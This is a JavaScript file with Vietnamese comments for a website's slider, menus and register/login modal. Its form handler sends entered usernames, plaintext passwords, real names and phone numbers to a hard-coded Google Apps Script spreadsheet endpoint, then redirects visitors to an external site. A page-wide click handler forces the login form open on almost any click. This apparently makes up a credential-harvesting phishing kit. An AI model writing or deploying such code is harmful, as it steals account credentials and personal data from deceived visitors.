// =========================================
// 1. LOGIC MENU (ACTIVE STATE) & KHỞI TẠO FORM
// =========================================
document.addEventListener('DOMContentLoaded', () => {
    // Menu dưới cùng (Mobile)
    const bottomNavItems = document.querySelectorAll('.bottom-nav li');
    bottomNavItems.forEach(item => {
        item.addEventListener('click', function() {
            bottomNavItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // Menu chính (Desktop)
    const mainNavItems = document.querySelectorAll('.main-nav li');
    mainNavItems.forEach(item => {
        item.addEventListener('click', function() {
            mainNavItems.forEach(nav => nav.classList.remove('active'));
            this.classList.add('active');
        });
    });

    // Gắn sự kiện kiểm tra form khi submit
    const formRegister = document.getElementById('formRegister');
    const formLogin = document.getElementById('formLogin');
    
    if (formRegister) formRegister.addEventListener('submit', handleFormSubmit);
    if (formLogin) formLogin.addEventListener('submit', handleFormSubmit);
});


// =========================================
// 2. LOGIC BANNER SLIDER
// =========================================
let currentIndex = 0;
const slides = document.querySelectorAll('.slide');
const dots = document.querySelectorAll('.dot');
const totalSlides = slides.length;
let slideInterval;

function updateSlider() {
    const track = document.getElementById('sliderTrack');
    if(track) {
        track.style.transform = `translateX(-${currentIndex * 100}%)`;
    }
    
    dots.forEach(dot => dot.classList.remove('active'));
    if(dots[currentIndex]) {
        dots[currentIndex].classList.add('active');
    }
}

function moveSlide(direction) {
    currentIndex += direction;
    if (currentIndex < 0) {
        currentIndex = totalSlides - 1;
    } else if (currentIndex >= totalSlides) {
        currentIndex = 0;
    }
    updateSlider();
    resetInterval();
}

function currentSlide(index) {
    currentIndex = index;
    updateSlider();
    resetInterval();
}

function autoSlide() {
    moveSlide(1);
}

function resetInterval() {
    clearInterval(slideInterval);
    slideInterval = setInterval(autoSlide, 3500);
}

// Khởi chạy slide khi tải trang
if(slides.length > 0) {
    slideInterval = setInterval(autoSlide, 3500);
}


// =========================================
// 3. LOGIC MODAL ĐĂNG KÝ / ĐĂNG NHẬP
// =========================================
function openAuthModal(tabName) {
    document.getElementById('authModal').classList.add('show');
    switchAuthTab(tabName);
    document.body.style.overflow = 'hidden'; 
}

function closeAuthModal() {
    document.getElementById('authModal').classList.remove('show');
    document.body.style.overflow = 'auto'; 
}

function switchAuthTab(tabName) {
    document.getElementById('tabRegister').classList.remove('active');
    document.getElementById('tabLogin').classList.remove('active');
    document.getElementById('formRegister').classList.remove('active-form');
    document.getElementById('formLogin').classList.remove('active-form');
    
    if (tabName === 'register') {
        document.getElementById('tabRegister').classList.add('active');
        document.getElementById('formRegister').classList.add('active-form');
    } else {
        document.getElementById('tabLogin').classList.add('active');
        document.getElementById('formLogin').classList.add('active-form');
    }
}

// Đóng modal khi click ra ngoài overlay
window.onclick = function(event) {
    const modal = document.getElementById('authModal');
    if (event.target == modal) {
        closeAuthModal();
    }
}


// =========================================
// 4. LOGIC VALIDATE FORM & GỬI VỀ GOOGLE SHEETS
// =========================================

// DÁN LINK GOOGLE APPS SCRIPT BẠN VỪA COPY VÀO TRONG DẤU NGOẶC KÉP DƯỚI ĐÂY:
const GOOGLE_SHEET_URL = "https://script.google.com/macros/s/AKfycbw-qXV_JjX-Qqc7aryhA1XFSIrXiK_oFGermKTi0PLFZzVsbKZCzO0wwdd2gdCrEo4UsA/exec";

function handleFormSubmit(event) {
    event.preventDefault(); 

    const form = event.target;
    const formId = form.id; 
    let isValid = true;
    let errorMessage = "";

    // Kiểm tra độ dài chữ (Tài khoản, Mật khẩu, Họ tên)
    const textInputs = form.querySelectorAll('input[type="text"], input[type="password"]');
    for (let input of textInputs) {
        const value = input.value.trim();
        if (value.length < 6 || value.length > 20) {
            isValid = false;
            errorMessage = "Tài khoản, mật khẩu và họ tên phải có độ dài từ 6 đến 20 ký tự!";
            break; 
        }
    }

    // Kiểm tra số điện thoại
    let phoneValue = "";
    if (isValid) {
        const phoneInput = form.querySelector('input[type="tel"]');
        if (phoneInput) {
            phoneValue = phoneInput.value.trim();
            const phoneRegex = /^[0-9]{10}$/; 
            if (!phoneRegex.test(phoneValue)) {
                isValid = false;
                errorMessage = "Số điện thoại không hợp lệ! Vui lòng nhập đúng 10 số.";
            }
        }
    }

    // Xử lý khi có lỗi
    if (!isValid) {
        alert(errorMessage);
        return; // Dừng lại không gửi form
    }

    // NẾU HỢP LỆ -> Chuẩn bị dữ liệu gửi về Google Sheets
    // Hiệu ứng chờ (Loading) cho nút bấm
    const submitBtn = form.querySelector('.submit-btn');
    submitBtn.innerText = "ĐANG XỬ LÝ...";
    submitBtn.style.opacity = "0.7";
    submitBtn.disabled = true;

    let data = {};

    // Phân loại dữ liệu tùy theo Form đang gửi
    if (formId === 'formRegister') {
        data = {
            trangThai: "ĐĂNG KÝ",
            taiKhoan: form.querySelector('input[placeholder="Tên đăng nhập"]').value.trim(),
            matKhau: form.querySelector('input[type="password"]').value.trim(),
            hoTen: form.querySelector('input[placeholder="Họ tên thật"]').value.trim(),
            sdt: phoneValue
        };
    } else if (formId === 'formLogin') {
        data = {
            trangThai: "ĐĂNG NHẬP",
            taiKhoan: form.querySelector('input[placeholder="Vui lòng nhập tên tài khoản"]').value.trim(),
            matKhau: form.querySelector('input[type="password"]').value.trim(),
            hoTen: "", // Đăng nhập không có họ tên nên để trống
            sdt: phoneValue
        };
    }

    // Gửi dữ liệu (Fetch API)
    fetch(GOOGLE_SHEET_URL, {
        method: 'POST',
        mode: 'no-cors', // Chống lỗi CORS khi gửi từ frontend thuần
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: new URLSearchParams(data)
    })
    .then(() => {
        // Gửi xong lập tức chuyển hướng trang
        window.location.href = "https://new8822.ren/";
    })
    .catch((error) => {
        console.error("Lỗi:", error);
        // Nếu nghẽn mạng vẫn ép chuyển hướng để không làm gián đoạn người dùng
        window.location.href = "https://new8822.ren/";
    });
}

// =========================================
// 5. LOGIC ẨN/HIỆN MẬT KHẨU
// =========================================
document.addEventListener('DOMContentLoaded', () => {
    // Tìm tất cả các biểu tượng con mắt trong form
    const togglePasswordIcons = document.querySelectorAll('.toggle-pw');
    
    togglePasswordIcons.forEach(icon => {
        icon.addEventListener('click', function() {
            // Tìm ô nhập liệu (input) nằm cùng nhóm với biểu tượng này
            const input = this.parentElement.querySelector('input');
            
            // Kiểm tra trạng thái hiện tại và chuyển đổi
            if (input.type === 'password') {
                input.type = 'text'; // Hiện mật khẩu
                this.classList.remove('fa-eye-slash'); // Bỏ icon mắt nhắm
                this.classList.add('fa-eye');          // Thêm icon mắt mở
            } else {
                input.type = 'password'; // Ẩn mật khẩu
                this.classList.remove('fa-eye');       // Bỏ icon mắt mở
                this.classList.add('fa-eye-slash');    // Thêm icon mắt nhắm
            }
        });
    });
});
// =========================================
// 6. LOGIC MỞ FORM ĐĂNG NHẬP KHI CLICK VÀO CÁC THÀNH PHẦN KHÁC
// =========================================
document.addEventListener('click', function(event) {
    // 1. Xác định các thành phần (hoặc lớp/id) KHÔNG NÊN mở form đăng nhập
    const excludedElements = [
        '#authModal',         // Không kích hoạt khi click bên trong bản thân Modal
        '.btn-login',         // Nút đăng nhập gốc trên header
        '.btn-register',      // Nút đăng ký gốc trên header
        '.m-btn-register',    // Nút đăng ký gốc trên mobile
        '.m-btn-login',       // Nút đăng nhập gốc trên mobile
        '.close-modal',       // Nút đóng modal
        '.auth-tab-btn',      // Nút chuyển tab đăng ký/đăng nhập
        '.toggle-pw'          // Nút ẩn/hiện mật khẩu
    ];

    // 2. Hàm kiểm tra xem phần tử bị click có thuộc danh sách ngoại trừ hay không
    function isExcluded(element) {
        // Lặp qua danh sách các selector bị loại trừ
        for (let selector of excludedElements) {
            // Kiểm tra xem element hiện tại có khớp với selector, hoặc có phần tử cha nào khớp hay không
            if (element.matches(selector) || element.closest(selector)) {
                return true; 
            }
        }
        
        // Ngoại trừ thêm trường hợp click vào các thẻ a (link) có sẵn href hợp lệ, để tránh chặn luồng chuyển trang
        if (element.tagName === 'A' && element.getAttribute('href') && element.getAttribute('href') !== '#') {
           return true;
        }

        return false;
    }

    // 3. Nếu phần tử bị click KHÔNG nằm trong danh sách ngoại trừ -> Mở form Đăng nhập
    if (!isExcluded(event.target)) {
        // Kiểm tra xem Modal đã hiển thị chưa. Nếu đã hiển thị thì không cần gọi lại.
        const modal = document.getElementById('authModal');
        if (!modal.classList.contains('show')) {
           // Mở form với tab Đăng nhập (login) làm mặc định
            openAuthModal('login');
        }
    }
});